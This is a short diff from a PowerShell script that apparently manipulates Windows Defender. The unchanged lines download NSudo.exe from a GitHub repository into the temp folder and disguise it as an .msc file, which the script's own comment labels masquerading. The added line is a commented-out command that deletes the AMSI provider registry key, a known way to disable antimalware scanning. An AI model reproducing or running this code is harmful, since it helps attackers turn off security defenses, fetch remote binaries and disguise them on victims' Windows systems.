@@ -204,6 +204,7 @@ If($Action -ieq "Query"){## Query Windows Defender state
 
       ## Download standalone binary from @swagkarna github repository
       # And Masquerade standalone executable to look like one .msc archive { MITRE ATT&CK T1036 }
+      # Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
       powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/NSudo.exe','$Env:TMP\BCDstore.msc') }"
       If(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue){
 
